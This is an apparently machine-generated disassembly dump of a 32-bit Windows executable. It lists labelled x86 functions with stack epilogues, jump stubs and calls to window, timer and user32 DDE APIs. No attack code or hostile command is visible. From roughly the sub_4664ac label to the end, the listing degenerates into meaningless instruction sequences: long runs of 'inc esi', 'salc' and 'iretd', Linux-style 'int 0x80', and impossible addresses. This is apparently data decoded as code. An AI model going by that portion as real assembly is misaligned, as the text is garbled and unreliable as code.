je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_45d934
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_45d960
xor edx edx
call sub_45d858
retn
sub_45d968
mov dl 0x1
call sub_45d858
retn
sub_45d9dc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45d9f4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_45dac1
jmp sub_4039c0
sub_45dac8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e212
jmp sub_40370c
sub_45e810
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
j_sub_40370c#9
jmp sub_40370c
j_sub_40370c
jmp sub_40370c
sub_45e986
jmp sub_4039c0
sub_45e98d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45e994
call sub_40c8d0
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_45eb8d
jmp sub_4039c0
sub_45eb94
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45ec5b
jmp sub_4039c0
sub_45ec62
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ee38
jmp sub_4039c0
sub_45ee3f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45eea0
jmp sub_4039c0
sub_45eea7
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45eeb0
call sub_45ec78
retn
sub_45f09b
jmp sub_40370c
sub_45f0f4
jmp sub_4039c0
sub_45f0fb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f229
jmp sub_4039c0
sub_45f388
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_45f687
jmp sub_4039c0
sub_45f6b6
jmp sub_4039c0
sub_45f7c2
jmp sub_4039c0
sub_45f7c9
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45fb5a
jmp sub_4039c0
sub_45fb61
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45fc84
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_45fccf
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_45fce0
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_45fcf0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_45fd63
jmp sub_4039c0
sub_45fd6a
pop ebp
retn
sub_45fd6c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45fd00
call sub_403d90
call sub_45fc84
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_455938
call sub_4134bc
sub_4601ce
jmp sub_4039c0
sub_4601d5
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46034d
jmp sub_4039c0
sub_460354
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4603a1
jmp sub_4039c0
sub_4603a8
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4605b9
jmp sub_4039c0
sub_4605c0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_460792
jmp sub_4039c0
sub_460799
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4607c9
jmp sub_4039c0
sub_4607d0
pop ebp
retn
sub_4607d4
sub [ rw-data ] 0x1
retn
sub_461026
[ eax + eax ]
sub_4614bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f594
movsx eax [ esi + 0x8 ]
mov [ ebx + 0x234 ] eax
pop esi
pop ebx
retn
sub_461538
push ebx
mov ebx eax
mov eax ebx
call sub_442e2c
mov eax ebx
call sub_461888
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_461d18
sub_4615b4
jmp sub_4039c0
sub_4615bb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_461658
jmp sub_4039c0
sub_46165f
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46175e
jmp sub_4039c0
sub_461765
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46187a
jmp sub_4039c0
sub_461881
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461888
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
setne al
pop ebx
retn
sub_46194d
jmp sub_4039c0
sub_461954
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461a28
mov eax [ eax + 0x208 ]
retn
sub_461c76
jmp sub_4039c0
sub_461d08
jmp sub_4039c0
sub_461d0f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461d58
xor edx edx
call sub_461668
retn
sub_461d60
mov al 0x1
retn
sub_461f51
jmp sub_4039c0
sub_461f58
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46213e
jmp sub_4039c0
sub_462145
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462184
push ebx
mov ebx eax
mov eax edx
dec eax
mov edx eax
mov eax ebx
call sub_4621c8
mov edx eax
mov eax ebx
call sub_461aa8
pop ebx
retn
sub_4623d8
jmp sub_4039c0
sub_4623df
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46246b
jmp sub_4039c0
sub_462472
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4624f9
jmp sub_4039c0
sub_462500
pop ebx
mov esp ebp
pop ebp
retn
sub_462606
jmp sub_4039c0
sub_46260d
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46285e
jmp sub_4039c0
sub_462865
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462908
mov edx [ rw-data ]
cmp [ edx + 0x4 ] 0x11
jne r-xdata
xor eax eax
retn
add al 0x5f
sub al 0x3f
jb r-xdata
mov al 0x1
retn
sub_4629ee
jmp sub_4039c0
sub_4629f5
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_462cb2
jmp sub_4039c0
sub_462cb9
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4630cc
jmp sub_4039c0
sub_4630d3
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_463161
jmp sub_4039c0
sub_463168
pop ebp
retn
sub_46316c
sub [ rw-data ] 0x1
retn
DdeInitializeA
jmp [ __import_lookup_table_13(user32:DdeInitializeA) ]
DdeUninitialize
jmp [ __import_lookup_table_13(user32:DdeUninitialize) ]
DdeConnect
jmp [ DdeConnect@IAT ]
DdeDisconnect
jmp [ __import_lookup_table_13(user32:DdeDisconnect) ]
DdeQueryConvInfo
jmp [ __import_lookup_table_13(user32:DdeQueryConvInfo) ]
DdeSetUserHandle
jmp [ __import_lookup_table_13(user32:DdeSetUserHandle) ]
DdePostAdvise
jmp [ __import_lookup_table_13(user32:DdePostAdvise) ]
DdeNameService
jmp [ __import_lookup_table_13(user32:DdeNameService) ]
DdeClientTransaction
jmp [ DdeClientTransaction@IAT ]
DdeCreateDataHandle
jmp [ DdeCreateDataHandle@IAT ]
DdeAccessData
jmp [ DdeAccessData@IAT ]
DdeUnaccessData
jmp [ DdeUnaccessData@IAT ]
DdeFreeDataHandle
jmp [ DdeFreeDataHandle@IAT ]
DdeGetLastError
jmp [ DdeGetLastError@IAT ]
DdeQueryStringA
jmp [ DdeQueryStringA@IAT ]
DdeCmpStringHandles
jmp [ __import_lookup_table_13(user32:DdeCmpStringHandles) ]
sub_463229
jmp sub_4039c0
sub_463230
pop ebp
retn
sub_463234
sub [ rw-data ] 0x1
retn
sub_4634c9
0x34c00041 0x40
inc esp
xchg esp eax
inc ecx
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
int3
sub_463cea
jmp sub_4039c0
sub_463cf1
pop ebx
mov esp ebp
pop ebp
retn
sub_463fbc
jmp sub_4039c0
sub_463fc3
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_464144
jmp sub_4039c0
sub_46414b
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464289
jmp sub_4039c0
sub_464290
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_464380
jmp sub_4039c0
sub_464387
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_464496
jmp sub_4039c0
sub_46449d
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46454f
jmp sub_4039c0
sub_464556
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46455c
push ebx
mov ecx [ eax + 0x40 ]
mov ebx [ ecx + 0x8 ]
mov eax ecx
mov ecx edx
mov edx ebx
call sub_413a44
pop ebx
retn
sub_464570
mov eax [ eax + 0x40 ]
call sub_413b0c
retn
sub_4646ba
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
sub_4646c8
jmp sub_4039c0
j_sub_4646ba
jmp sub_4646ba
sub_4646cf
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46477f
jmp sub_4039c0
sub_464786
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46484f
jmp sub_4039c0
sub_464856
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464bea
jmp sub_4039c0
sub_464bf1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464da0
mov [ eax + 0xc6 ] 0x0
retn
sub_464e84
cmp dl [ eax + 0xc7 ]
je r-xdata
retn
mov [ eax + 0xc7 ] dl
cmp [ eax + 0x38 ] 0x0
je r-xdata
xor ecx ecx
xor edx edx
call sub_464dec
sub_464ea4
retn
sub_464ea8
retn
sub_464eac
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_404010
pop esi
pop ebx
retn
sub_464ec0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_404010
pop esi
pop ebx
retn
sub_464ed4
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_464ef4
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_465077
jmp sub_4039c0
sub_46507e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465190
retn
sub_465194
retn
j_sub_4039c0#9
jmp sub_4039c0
sub_4652ac
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4039c0#8
jmp sub_4039c0
sub_465388
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4653f8
push ecx
push edx
call DdeAccessData
retn
sub_465400
push edx
call DdeUnaccessData
retn
sub_465520
mov eax [ eax + 0x10 ]
call sub_46511c
retn
sub_4655a8
mov [ eax + 0x34 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_419450
j_sub_4039c0#7
jmp sub_4039c0
sub_46568b
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_4039c0#6
jmp sub_4039c0
sub_465722
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_4039c0#5
jmp sub_4039c0
sub_4657b2
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4657bc
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
j_sub_4039c0#4
jmp sub_4039c0
sub_465902
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46590c
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_465920
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
j_sub_4039c0#3
jmp sub_4039c0
sub_465b23
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
j_sub_4039c0#2
jmp sub_4039c0
sub_465c0a
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_465d35
jmp sub_4039c0
sub_465d3c
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
j_sub_4039c0
jmp sub_4039c0
sub_465ff4
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_466000
mov edx [ eax + 0x38 ]
push edx
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdePostAdvise
retn
sub_4660a9
jmp sub_4039c0
sub_4660b0
pop ebp
retn
sub_4664ac
retn 0xd662
sub_4664c7
inc esi
dec ecx
iretd
sub_4664e5
dec esp
inc esi
inc esi

sub_4664e9
retn
sub_4664eb
mov ebx 0xcb16b9b9
retn
sub_4664f1
mov esi 0xcd16b9b9
sub [ edi + 0x46465a0b ] 0xd6
adc ebp [ edi + 0x46467411 ]
and bh cl
adc esp [ ebp + esi * 2 + 0x20282c94 ]
iretd
sub_466564
inc esi
inc esi
adc [ esi + 0x464651fd ] ch
pop ds
retn
sub_4665ba
add esi [ esi + ebx - 0x30df97d4 ]
add esi [ edx + 0x3cf201e ]
mov al 0x2c
and ebx [ esi ]
and bh cl
add edi [ esi + 0x201e3e2c ]
iretd
sub_46664b
rcl dh 0x46
inc esi
inc esi
scasb [ edi ]
0x4648
sub_466654
inc esi
mov eax [ cs : 0x11b3c641 ]
iretd
sub_46665c
rcl dl 0x46
inc esi
inc esi
scasb [ edi ]
cmp eax 0x2e464648
pop ebp
xchg edx eax
push ss
and al 0x11
iretd
sub_4666a1
scasd [ edi ]
mov ebp 0xd646467f
salc
salc
salc
pop ebp
xchg [ edi ] bl
mov cl 0x9e
pop [ ebp - 0x2929292a ]
dec ecx
0x52a6
sub_4666e9
inc esi
inc esi
inc esp
stc
int3
sub_466721
or esi [ edx + 0x203e2c1f ]
iretd
sub_466728
or esi [ eax - 0x30df7133 ]
or edi [ esi + 0xbcf201f ]
mov esp 0x8ecd242c
and bh cl
or edi [ edx - 0x30df708b ]
or edi [ eax + 0x20222c1f ]
iretd
sub_466748
or edx [ esi + 0x20312c1f ]
iretd
sub_46674f
or edx [ edi + ebp * 4 + 0x46465c8f ]
salc
salc
inc ebx
retn 0x4646
sub_46675c
inc esi
push ss

sub_46675f
retn 0xde62
sub_46679d
0xda62
sub_4667e9
0xb9bb
sub_4667ec
mov ecx 0x467018ae
inc esi
pop ds
pop ds
retn
sub_466819
inc esi

sub_46681b
add edi [ esi - 0x517f32ea ]
shl [ eax + 0x46 ] 0x46
pop ds
retn
sub_466899
outsb
add eax [ esi + 0x46 ]
scasd [ edi ]
mov dh 0x7f
inc esi
inc esi
iretd
sub_4668a3
add ah [ edx + 0x5e ]
iretd
sub_4668a7
add ah [ edx + 0x5a ]
jg r-xdata
inc esi
inc esi
lds esp [ edx ]
bound edx [ esi + 0x46 ]

pop esi
dec ecx
rcr bh 0x45
sub_4668b9
add ah [ edx + 0x56 ]
push ss
scasd [ edi ]
shl [ edi + 0x46 ] 0x1
inc esi
salc

sub_4668c4
add ebx [ edx + 0x31af1615 ]
push esi
inc esi
inc esi
salc
sub al 0x70
and bh cl
cmp ebp [ esi + 0x20722c19 ]
iretd
sub_4668d9
adc ebp [ edx + 0x20 ]
iretd
sub_4668ee
0x10464642 0xaf11
sub_466930
in al 0xf
inc esi
inc esi
dec ecx
int1
add eax 0x86c3205a
dec ecx
retn 0x533d
sub_46693f
inc esi
inc esi
int 0xbe
inc ebp
mov ebp 0x5337c249
inc esi
inc esi
lds edi [ edx ]
bound ebx [ edx + 0x47 ]
dec ecx
retn
sub_466952
dec ecx
pop es
inc esi
inc esi
lds edi [ edx ]
bound edx [ edx + 0x47 ]
dec ecx
retn
sub_46695f
inc esi
inc esi

sub_466967
inc ecx
push ss
mov [ ecx + 0x4646468c ] 0xe662c2cb
inc esp
inc esi
inc esi
adc [ edi + 0x46465e4d ] ebp
salc
salc
push ss

sub_4669aa
xchg [ ecx - 0x3e ] cl
mov ch 0x69
inc esi
inc esi

sub_4669b9
add al [ esi + 0x46 ]
retn
sub_4669d6
retn 0xde62
sub_466a97
add esi [ edx + 0x464d4eaf ]
inc esi
pop ss
scasd [ edi ]
sub eax 0xd6b9b9bb
salc
salc
salc
retn
sub_466aa9
xchg [ ecx - 0x3d ] cl
or bh [ ebx + 0xdafb9b9 ]
push ecx
inc esi
inc esi
salc
and bh cl
add ebp [ eax + 0x20202c1e ]
iretd
sub_466abf
add esi [ esi + 0x202f2c1e ]
iretd
sub_466b15
adc esp [ esi ]
sbb al 0x2c
and al 0x20
iretd
sub_466b1c
adc esp [ esp + ebx ]
and bh cl
adc esp [ edx ]
sub al 0x21
sbb al 0x20
iretd
sub_466b74
popfd
dec ecx
retn 0xbb7
sub_466bbb
retn
sub_466c52
inc esi
inc esi
lds edi [ edx ]
bound esp [ edx + 0x46 ]
dec ecx
retn 0xb35
sub_466c61
add eax 0xf049167e
add eax 0x35b91658
push ds
int 0x80
adc [ esi + 0x464667d2 ] ebp
lds eax [ edx + 0x6202cf56 ]
retn
sub_466c7c
xchg [ ecx - 0x3e ] cl
or [ ebx ] ecx
inc esi
inc esi

sub_466d67
outsb
inc esi
inc esi

sub_466e98

sub_466ee5
retn
sub_466f32
or esi [ esi + 0x20322c1f ]
iretd
sub_466f9f
cmp edx [ esi + 0x47 ]
dec ecx
retn
sub_466feb
xchg [ ecx - 0x3d ] cl
sub [ esi + eax * 2 + 0x46 ] eax
jne r-xdata
iretd
sbb [ eax ] ebx
sbb eax 0xd6d6858f
salc
salc
salc
salc
salc
iretd
sub_46706c
xchg esi eax
mov ebx 0x1615b9b9
iretd
sub_467073
sbb edi [ edx + 0x460c70af ]
inc esi
salc
int 0x3a

sub_4670ee
add edi [ edx + 0x4601b5af ]
inc esi
salc
salc
salc
dec ecx
retn
sub_467123
popfd
dec ecx
retn 0x59b5
sub_4671fd
inc esi
inc esi
stc
or [ edx ] dh
inc esi
inc esi
and [ ebp - 0x77 ] bh
dec ecx
retn
sub_46729c
adc edi edx
scasd [ edi ]
cmp [ edi - 0x29294647 ] edi
dec ecx
retn 0x6b21
sub_467301
retn
sub_467351
inc esi
inc esi
lds eax [ eax + 0x78c52044 ]
inc esi
dec ecx
retn
sub_4673bb
sbb [ edx - 0x1 ] al
mov ecx 0xcf4646b9
sbb edi [ esi + 0x1f1e4581 ]
pop ds
pop ds
and [ ebp - 0x69 ] bh
dec ecx
retn 0x7835
sub_4673d2
inc esi
inc esi

sub_4674b1
xchg [ ecx - 0x3d ] cl
sbb [ esi + 0x3cbb9b9 ] edi
stosb [ edi ]
push ss
int 0x80
scasb [ edi ]
scasb [ edi ]
outsd
inc esi
inc esi
pop ds
retn
sub_4674c5
xchg [ ecx - 0x3d ] cl
or eax 0xcbb9b9be
add esp esi
push ss
int 0x80
scasb [ edi ]
xchg edx eax
outsd
inc esi
inc esi
pop ds
retn
sub_467534
sbb eax [ esi + 0x2c ]
sub ch cl
pushfd
and bh cl
sbb eax [ ebp + ebx + 0x20 ]
iretd
sub_4675c8
adc esi [ esp + ebp + 0x22 ]
sbb al 0x20
iretd
sub_4675cf
adc esi [ edx + 0x2c ]
and al 0x1c
and bh cl
adc esi [ eax + 0x2c ]
and [ eax ] esp
iretd
sub_46766c
imul edi [ ebp + 0x46 ] 0x779daf46
inc esi
inc esi
dec ecx
retn
sub_4676b8
adc ebx [ eax + 0x20232c1c ]
iretd
sub_4676bf
adc esp [ esi - 0x578450e4 ]
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x542
sub_4676e6
dec esi
inc esp
inc esi
inc esi
scasd [ edi ]
lea esi [ edx - 0x29294647 ]
iretd
sub_46777b
inc esi
inc esi
scasb [ edi ]
push eax
inc esp
inc esi
inc esi
iretd
sub_46783a
iretd
sub_46783b
adc esp esp
sbb al 0x20
iretd
sub_467840
or esp eax
and bh cl
add ebp eax
int 0x88

sub_4679df
adc cl [ edi + 0x46 ]
inc esi
adc eax 0xb6cd1110
stc
inc edx
inc edi
inc esi
inc esi
adc ebx ecx
retn
sub_4679f0
mov esi 0x7516b9b9
popfd
adc eax 0xc30a10b9
xchg [ ecx - 0x3e ] cl
adc cl [ edx + 0x46 ]
inc esi

sub_467a04
retn
sub_467a3c
push ss
inc esp
inc esi
inc esi
adc [ esi - 0x32d8d3e1 ] ebp
xchg [ edi - 0x4646543e ] ebp
salc
adc edi ecx
add [ edx - 0x52 ] ah
int3
sub_467ac4

sub_467ad5
sbb [ edi + 0x4646571a ] ebp
salc
salc
salc
pop ds
retn
sub_467b89
inc esp
inc esi
dec ecx
retn
sub_467c4e
xchg [ ecx - 0x3e ] cl
inc edx
inc esi
inc esi
inc esi
push ss
mov ecx 0x3dc54e10
push es
inc esi
dec ecx
retn 0x466e
sub_467c93
xchg esp eax
stosd [ edi ]
mov ecx 0x77a1aeb9
inc esi
inc esi
retn
sub_467c9d
xchg [ edi + 0x464679f9 ] ch
salc
salc
salc
salc
salc
salc
scasb [ edi ]

sub_467cab
pop eax
inc esi
inc esi
retn
sub_467caf
xchg [ edi + 0x464605a0 ] ch
sbb bl al
xchg [ edi - 0x46465482 ] ch
salc
salc
mov ecx 0x4646c6d0
inc esi
iretd
sub_467cec
popfd
dec ecx
retn 0x6d3b
sub_467d6f

sub_467d70
mov esi 0xafb9b9bb
mov [ 0xffffffffd6b9b9b9 ] eax

sub_467d9e
retn
sub_467e76
inc esi
salc
pop ds
retn
sub_467e7a
xchg [ edi - 0x46465729 ] ch
salc
salc
dec ecx
retn 0x5984
sub_467ec3
lea eax [ edi ]
inc esi
inc esi
int 0x5
push esi
retn
sub_467ecb
xchg [ ecx - 0x3e ] cl
inc edx
inc esi
inc esi
inc esi
push ss
mov ecx 0x22c4e10
jne r-xdata
dec ecx
retn

sub_467f3b
ror [ esi - 0x50b9b9ba ] 0x54
imul eax [ esi + 0x46 ] 0xffffffd6
salc
salc
salc
retn
sub_467f4b
dec ecx
retn 0x612d
sub_467f53
push 0x292c4646
sbb al 0x2c
and eax 0x5003cf20
int 0x84
and bh cl
add ebx [ esi + 0x1e ]
scasd [ edi ]
xor [ ebp + 0x46 ] dl
inc esi
dec ecx
retn 0x4658
sub_467fd1
inc esi
inc esi

sub_467fd4
retn
sub_468035
shr dl 0x46
inc esi
inc esi
scasb [ edi ]
in al 0xb2
mov ecx 0x331d2eb9
int3
sub_468473
push 0x44
inc esi
inc esi
sub al 0x7c
push ds
sub al 0x1c
and bh cl
add ebx [ edx + 0x20292c1e ]
iretd
sub_4684bc
sbb ah [ edx + 0x52 ]
scasd [ edi ]
mov esi 0xd646466d

sub_4684e1
popfd
dec ecx
retn 0xa029
sub_4685e4
inc esi
inc esi
scasb [ edi ]
dec ecx
push 0x46
inc esi
int 0xb
dec esi
scasd [ edi ]
adc ecx [ esi + eax * 2 + 0x46 ]

sub_4685f4
add ebp [ edx + 0x16 ]
int 0x80
scasb [ edi ]
jmp r-xdata
inc esi
inc esi
sub al 0x2b
sbb [ eax ] esp
iretd
sub_4685fc
inc esi
inc esi
pop ds
retn
sub_468600
xchg [ ecx - 0x3d ] cl
push ss
jno r-xdata
dec esi
int3
inc esi

sub_46862a
xchg [ edi - 0x46466722 ] ch
adc [ ecx ] dl
iretd
sub_468661
cmp ebp [ esp + ebp - 0x30dfe6d2 ]
cmp ebp [ edx + 0x2019212c ]
iretd
sub_46866f
cmp ebp [ eax - 0x50e6dfd4 ]
int1
mov bl 0xb9
mov ecx 0x5e82c5d6
retn
sub_46869d
int 0x42
bound ebx [ edi ]
test esi edx
salc
salc
dec ecx
0x7322
sub_4686e0
inc esi
inc esi
int 0x9e
lds eax [ edx + 0x499dc34a ]
retn 0x74a5
sub_4686f5
dec ecx
retn 0x7491
sub_468705
mov ecx 0x7480c349
inc esi
inc esi

sub_46870d
add eax 0xbaf9af56
mov ecx 0x49d6d6b9
retn 0xa3df
sub_468755
0xb9bb
sub_4687b7
add ebp [ edi + ebp * 4 + 0x46464869 ]
and bh cl
adc ebp [ esi + 0x20342c1c ]
iretd
sub_4687c7
adc ebp [ esp + ebx - 0x464fad51 ]
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
lds edi [ ecx + 0x491d196b ]
retn
sub_468903
sbb esi [ esi - 0x465b2252 ]
mov ecx 0xc34a82c5
xchg [ edi + 0x46467157 ] ch

sub_468915
retn 0xd662
sub_468943
retn
sub_468a22
iretd
sub_468ad4
add esi [ edx - 0x465d9451 ]
mov ecx 0xd6d6d6d6
salc
salc
dec ecx
retn 0xa2a2
sub_468ae5
mov ecx 0x623ac5b9
bound eax [ esi + 0x49 ]
retn 0xa29f
sub_468b06
xchg [ ecx - 0x3e ] cl
daa
push edi
inc esi
inc esi
int 0x12
bound edx [ esi - 0x3b ]
test [ edx - 0x35 ] al
retn 0xd662
sub_468cdc

sub_468cdd
0xb9bb
sub_468dde
mov ecx 0x920bcbb9

sub_468de4
add eax [ edx + 0x4666c1ae ]
inc esi
retn
sub_468ef7
retn
sub_469059
sbb edi [ edx + 0x7d9a03cd ]
add [ edx + 0x49 ] dh
retn
sub_469138
salc
salc
salc
dec ecx
retn
sub_46913d
push edx
inc esi
inc esi
inc esi

sub_469142
add ebx [ edx - 0x517f32ea ]
sbb [ ebx + 0x46 ] ecx
inc esi
pop ds
retn
sub_469170
mov ecx 0xbbdfafb9
mov ecx 0x3cd16b9
mov esi 0x46e2c6cd
inc esi
inc esi
lds eax [ esi + 0x33b9164e ]
mov [ 0xffffffffcd5a11b9 ] al
or [ esi - 0x33 ] ch
add edi [ esi + 0x16ba0b45 ]
iretd
sub_469196
into
test [ esi + 0x46 ] 0x46
mov ecx 0xd1b9ae33
retn 0x4646
sub_4691a3
inc esi
jne r-xdata
rol [ edi + 0x181987cd ] cl
scasd [ edi ]
jmp 0xffffffffd7004ad2
iretd
sub_4691a7
sbb esp [ esi + 0x466052af ]
inc esi
salc
salc
salc
int 0xb8
mov ecx 0x49626232
retn
sub_4692ec
add ebx [ edx - 0x33 ]
test [ eax ] ah
iretd
sub_46935d
add [ esi ] al
scasb [ edi ]
cmp esp [ edi + 0x232eb9b9 ]
mov ch 0x11
mov cl 0x11
iretd
sub_46937b
iretd
sub_4693b6
add ebx [ edx + 0x20362c1e ]
iretd
sub_4693bd
add ebx [ eax + 0x20682c1e ]
iretd
sub_4693c4
add esp [ esi + 0x20242c1e ]
iretd
sub_4694f9
xor esp [ eax + ebx - 0x30df6733 ]
sbb esp [ edx - 0x6132ded4 ]
and bh cl
sbb esp [ eax - 0x30df628b ]
sbb ebp [ esi - 0x4663ed51 ]
mov ecx 0xd6d6d6d6
salc
salc

sub_46951c
add ebp [ edx - 0x55fc7eea ]
xor eax 0x812a232e
add esi [ esi + 0x4674752a ]
mov ecx 0xc39ecd95
popfd
dec ecx
retn 0xbd34
sub_469685
add esi [ esi + 0x32af1116 ]
mov ah 0xb9
mov ecx 0xd6d6d6d6
salc
scasb [ edi ]

sub_4696c1
retn
sub_4696c2
and bh [ ecx + 0x1610b9b9 ]
scasd [ edi ]
mov [ esi + 0x46 ] ecx
inc esi
salc
salc
salc
salc
iretd
sub_469751
inc esi
inc esi
int 0xb
dec esi
scasd [ edi ]
std
dec ebx
inc esi
inc esi

sub_4697ae
retn
sub_4697af
retn 0xb9bd
sub_4697b2
mov ecx 0x4e03cd16
mov ecx 0x86c36216
dec ecx
retn 0x8901
sub_469849
inc esi
inc esi
int 0x8e

sub_46984e
retn
sub_46984f
mov ebx 0xdeaeb9b9
pushfd
mov ecx 0x9a03cbb9
push ss

sub_4698dd
add edi [ edx + 0x4e33b916 ]
scasb [ edi ]
cmp esi [ edx + 0x1f1fb9b9 ]
retn
sub_4698fe
add ecx [ edx + 0x4972007d ]
retn
sub_469905
mov ebx 0x16b9b996
mov ecx 0xb7af9a33
xchg esi eax
mov ecx 0xcb16d6b9
retn
sub_469970

sub_469971
add ebp esi
scasb [ edi ]
